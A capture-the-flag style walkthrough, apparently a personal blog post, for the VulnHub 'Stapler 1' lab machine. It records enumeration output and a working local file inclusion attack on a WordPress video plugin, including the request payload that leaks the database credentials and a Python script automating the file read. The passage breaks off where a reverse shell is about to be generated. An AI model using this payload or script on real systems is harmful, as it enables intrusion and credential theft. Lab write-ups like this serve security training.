@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Stapler 1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Stapler 1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: This is a vulnerable VM that can to be owned in many ways." />
+<meta property="og:description" content="Description: This is a vulnerable VM that can to be owned in many ways." />
+<link rel="canonical" href="http://localhost:4000/stapler.html" />
+<meta property="og:url" content="http://localhost:4000/stapler.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/stapler.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-11-27T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/stapler.html" />
+<meta property="twitter:title" content="VulnHub - Stapler 1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Stapler 1","dateModified":"2021-11-27T00:00:00-05:00","datePublished":"2021-11-27T00:00:00-05:00","url":"http://localhost:4000/stapler.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/stapler.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: This is a vulnerable VM that can to be owned in many ways.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Stapler 1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>November 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> This is a vulnerable VM that can to be owned in many ways.</p>
+
+<p><strong>Author:</strong> g0tmi1k</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>The target host was discovered with netdiscover.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.0/24      
+ Currently scanning: Finished!   |   Screen View: Unique Hosts             
+                                                                           
+ 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 210        
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 192.168.179.171 08:00:27:f9:70:14      2      84  PCS Systemtechnik GmbH    
+ 192.168.179.254 00:50:56:fb:8c:55      3     126  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP port scan reveals many open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p1-65535</span> <span class="nt">--open</span> 192.168.179.171 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+139/tcp   open  netbios-ssn
+666/tcp   open  doom
+3306/tcp  open  mysql
+12380/tcp open  unknown
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>In order to discover more information about the open ports, an aggressive scan was performed with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p21</span>,22,53,80,139,666,3306,12380 192.168.179.171 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_Can<span class="s1">'t get directory listing: PASV failed: 550 Permission denied.
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.179.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
+|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
+|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
+53/tcp    open  domain      dnsmasq 2.75
+| dns-nsid:
+|_  bind.version: dnsmasq-2.75
+80/tcp    open  http        PHP cli server 5.5 or later
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: 404 Not Found
+139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
+666/tcp   open  doom?
+| fingerprint-strings:
+|   NULL:
+|     message2.jpgUT
+|     QWux
+|     "DL[E
+|     #;3[
+|     \xf6
+|     u([r
+|     qYQq
+|     Y_?n2
+|     3&amp;M~{
+|     9-a)T
+|     L}AJ
+|_    .npy.9
+3306/tcp  open  mysql?
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.7.12-0ubuntu1
+|   Thread ID: 37
+|   Capabilities flags: 63487
+|   Some Capabilities: SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, SupportsCompression, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSigpipes, Support41Auth, InteractiveClient, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongPassword, ConnectWithDatabase, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: OG/\x0F*L\x0Bimr{V\x17\x0CM3a4aq
+|_  Auth Plugin Name: mysql_native_password
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Tim, we need to-do better next year for Initech
+</span></code></pre></div></div>
+
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+
+<p>The anonymous login is available, so we can try to access the FTP service and download the note file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ftp 192.168.179.171
+Connected to 192.168.179.171.
+220-
+220-|-----------------------------------------------------------------------------------------|
+220-| Harry, make sure to update the banner when you get a chance to show <span class="nb">who </span>has access here |
+220-|-----------------------------------------------------------------------------------------|
+220-
+220 
+Name <span class="o">(</span>192.168.179.171:s4rgaz<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jun 04  2016 <span class="nb">.</span>
+drwxr-xr-x    2 0        0            4096 Jun 04  2016 ..
+<span class="nt">-rw-r--r--</span>    1 0        0             107 Jun 03  2016 note
+226 Directory send OK.
+ftp&gt; get note
+<span class="nb">local</span>: note remote: note
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>note <span class="o">(</span>107 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+107 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>50.7983 kB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>The note doesn’t say much, so we continue.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>note 
+Elly, make sure you update the payload information. Leave it <span class="k">in </span>your FTP account once your are <span class="k">done</span>, John.
+</code></pre></div></div>
+
+<h3 id="samba-enumeration">Samba Enumeration</h3>
+
+<p>The scan with enum4linux reveals two shared folders and a large list of system users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.171
+...
+ <span class="o">============================================</span>                                                                                                                       
+|    Share Enumeration on 192.168.179.171    |                                                                                                                      
+ <span class="o">============================================</span>                                                                                                                       
+                                                                                                                                                                    
+        Sharename       Type      Comment                                                                                                                           
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>                                                                                                                           
+        print<span class="nv">$ </span>         Disk      Printer Drivers                                                                                                                   
+        kathy           Disk      Fred, What are we doing here?                                                                                                     
+        tmp             Disk      All temporary files should be stored here                                                                                         
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>red server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+...
+<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-22-1 and logon username <span class="s1">''</span>, password <span class="s1">''</span>                                                                                         
+S-1-22-1-1000 Unix User<span class="se">\p</span>eter <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
+S-1-22-1-1001 Unix User<span class="se">\R</span>Nunemaker <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                     
+S-1-22-1-1002 Unix User<span class="se">\E</span>Tollefson <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                     
+S-1-22-1-1003 Unix User<span class="se">\D</span>Swanger <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                       
+S-1-22-1-1004 Unix User<span class="se">\A</span>Parnell <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                       
+S-1-22-1-1005 Unix User<span class="se">\S</span>Hayslett <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                      
+S-1-22-1-1006 Unix User<span class="se">\M</span>Bassin <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
+S-1-22-1-1007 Unix User<span class="se">\J</span>Bare <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
+S-1-22-1-1008 Unix User<span class="se">\L</span>Solum <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
+S-1-22-1-1009 Unix User<span class="se">\I</span>Chadwick <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                      
+S-1-22-1-1010 Unix User<span class="se">\M</span>Frei <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
+S-1-22-1-1011 Unix User<span class="se">\S</span>Stroud <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
+S-1-22-1-1012 Unix User<span class="se">\C</span>Ceaser <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
+S-1-22-1-1013 Unix User<span class="se">\J</span>Kanode <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
+S-1-22-1-1014 Unix User<span class="se">\C</span>Joo <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
+S-1-22-1-1015 Unix User<span class="se">\E</span>eth <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
+S-1-22-1-1016 Unix User<span class="se">\L</span>Solum2 <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
+S-1-22-1-1017 Unix User<span class="se">\J</span>Lipps <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
+S-1-22-1-1018 Unix User<span class="se">\j</span>amie <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
+S-1-22-1-1019 Unix User<span class="se">\S</span>am <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
+S-1-22-1-1020 Unix User<span class="se">\D</span>rew <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
+S-1-22-1-1021 Unix User<span class="se">\j</span>ess <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
+S-1-22-1-1022 Unix User<span class="se">\S</span>HAY <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
+S-1-22-1-1023 Unix User<span class="se">\T</span>aylor <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
+S-1-22-1-1024 Unix User<span class="se">\m</span>el <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
+S-1-22-1-1025 Unix User<span class="se">\k</span>ai <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
+S-1-22-1-1026 Unix User<span class="se">\z</span>oe <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
+S-1-22-1-1027 Unix User<span class="se">\N</span>ATHAN <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
+S-1-22-1-1028 Unix User<span class="se">\w</span>ww <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
+S-1-22-1-1029 Unix User<span class="se">\e</span>lly <span class="o">(</span>Local User<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<p>As is possible the null session I decided to mount the shared folder kathy to the attacking machine, the backup directory contains a FTP configuration file and a compressed copy of wordpress.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mount <span class="nt">-t</span> cifs //192.168.179.171/kathy /mnt/smb <span class="nt">-o</span> <span class="s1">'username=anonymous,password=,rw,vers=1.0'</span>
+root@kali:~<span class="nv">$ </span><span class="nb">cd</span> /mnt/smb
+root@kali:/mnt/smb<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 4
+drwxr-xr-x+ 4 root root    0 Jun  3  2016 <span class="nb">.</span>
+drwxr-xr-x  8 root root 4096 Oct 12 07:05 ..
+drwxr-xr-x+ 2 root root    0 Jun  5  2016 backup
+drwxr-xr-x+ 2 root root    0 Jun  5  2016 kathy_stuff
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p><strong>Enumeration on port 12380</strong></p>
+
+<p>The web page shows nothing.</p>
+
+<p><img src="/assets/images/stapler/screenshot-1.png" alt="" /></p>
+
+<p>An scan with nikto reveals that the page uses SSL, and also detected two web directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nikto <span class="nt">-host</span> http://192.168.179.171:12380/
+...
++ Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header <span class="s1">'dave'</span> found, with contents: Soemthing doesn<span class="s1">'t look right here
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The site uses SSL and Expect-CT header is not present.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '</span><span class="nt">-C</span> all<span class="s1">' to force check all possible dirs)
++ Entry '</span>/admin112233/<span class="s1">' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '</span>/blogblog/<span class="s1">' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Hostname '</span>192.168.179.171<span class="s1">' does not match certificate'</span>s names: Red.Initech
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ Uncommon header <span class="s1">'x-ob_mode'</span> found, with contents: 1
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
+</code></pre></div></div>
+
+<p>The <strong>/blogblog</strong> directory displays a wordpress web page.</p>
+
+<p><img src="/assets/images/stapler/screenshot-2.png" alt="" /></p>
+
+<p>Wpscan detected directory listing and a long list of wordpress users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--disable-tls-checks</span> <span class="nt">--url</span> https://192.168.179.171:12380/blogblog/  <span class="nt">-e</span> at, ap, u
+...
+<span class="o">[</span>+] Upload directory has listing enabled: https://192.168.179.171:12380/blogblog/wp-content/uploads/
+ | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confidence: 100%
+ ...
+ <span class="o">[</span>+] WordPress version 4.2.1 identified <span class="o">(</span>Insecure, released on 2015-04-27<span class="o">)</span><span class="nb">.</span>
+ | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  - https://192.168.179.171:12380/blogblog/?feed<span class="o">=</span>rss2, &lt;generator&gt;http://wordpress.org/?v<span class="o">=</span>4.2.1&lt;/generator&gt;
+ |  - https://192.168.179.171:12380/blogblog/?feed<span class="o">=</span>comments-rss2, &lt;generator&gt;http://wordpress.org/?v<span class="o">=</span>4.2.1&lt;/generator&gt;
+...
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] John Smith
+ | Found By: Author Posts - Display Name <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] elly
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] john
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] peter
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] barry
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] heather
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] garry
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] harry
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] scott
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] kathy
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] tim
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>With a manual enumeration was possible detect a vulnerable plugin called Advanced Video.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://192.168.179.171:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
+</code></pre></div></div>
+
+<p><img src="/assets/images/stapler/screenshot-3.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit wordpress advanced video
+<span class="nt">----------------------------------------------------------------------------</span> <span class="nt">------------------------------</span>
+ Exploit Title                                                              |  Path
+<span class="nt">----------------------------------------------------------------------------</span> <span class="nt">------------------------------</span>
+WordPress Plugin Advanced Video 1.0 - Local File Inclusion                  | php/webapps/39646.py
+<span class="nt">----------------------------------------------------------------------------</span> <span class="nt">------------------------------</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+
+<p>WordPress Plugin Adavnced Video embed is prone to a Local File Inclusion vulnerability because it fails to sufficiently verify user-supplied input.</p>
+
+<p>We copy the exploit to our current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/39646.py
+</code></pre></div></div>
+
+<p>The exploit doesn’t work and also it’s deprecated, so I will manually exploit it and try to read the wp-config.php file, to that we request the following link in the browser.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://192.168.179.171:12380/blogblog/wp-admin/admin-ajax.php?action<span class="o">=</span>ave_publishPost&amp;title<span class="o">=</span>random&amp;short<span class="o">=</span>1&amp;term<span class="o">=</span>1&amp;thumb<span class="o">=</span>../wp-config.php
+</code></pre></div></div>
+
+<p>As we can see the request was pocessed correctly.</p>
+
+<p><img src="/assets/images/stapler/screenshot-4.png" alt="" /></p>
+
+<p>Then we go to the home page, we can see that a new jpeg element was created.</p>
+
+<p><img src="/assets/images/stapler/screenshot-5.png" alt="" /></p>
+
+<p>We look for the link of the jpeg file with the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="s2">"https://192.168.179.171:12380/blogblog/"</span> | <span class="nb">grep</span> <span class="nt">-Po</span> <span class="s1">'http[^"]*jpeg'</span> | <span class="nb">head</span> <span class="nt">-1</span>  
+https://192.168.179.171:12380/blogblog/wp-content/uploads/249816638.jpeg
+</code></pre></div></div>
+
+<p>Then we request the jpeg link with curl, and we get the content from the wp-content.php file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="s2">"https://192.168.179.171:12380/blogblog/wp-content/uploads/249816638.jpeg"</span>
+...
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'plbkac'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
+...
+</code></pre></div></div>
+
+<p>Doing this manually is cumbersome, so I developed a python script to speed things up.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">f"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> ../wp-content.php"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://192.168.179.171:12380/blogblog/"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1"># Disable warnings 
+</span><span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+
+<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb="</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s">'No such file'</span> <span class="ow">in</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"File not found"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">regx</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'http[^"]*jpeg'</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="n">link</span> <span class="o">=</span> <span class="n">regx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We run the script adding as parameter the file to include, in this case <strong>default-ssl-conf</strong> file to know the DocumentRoot.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 poc.py /etc/apache2/sites-available/default-ssl.conf
+&lt;IfModule mod_ssl.c&gt;
+	&lt;VirtualHost _default_:12380&gt;
+		ServerAdmin garry@red
+
+		DocumentRoot /var/www/https
+...
+</code></pre></div></div>
+
+<p>We generate our php reverse shell with msfvenom.</p>
+
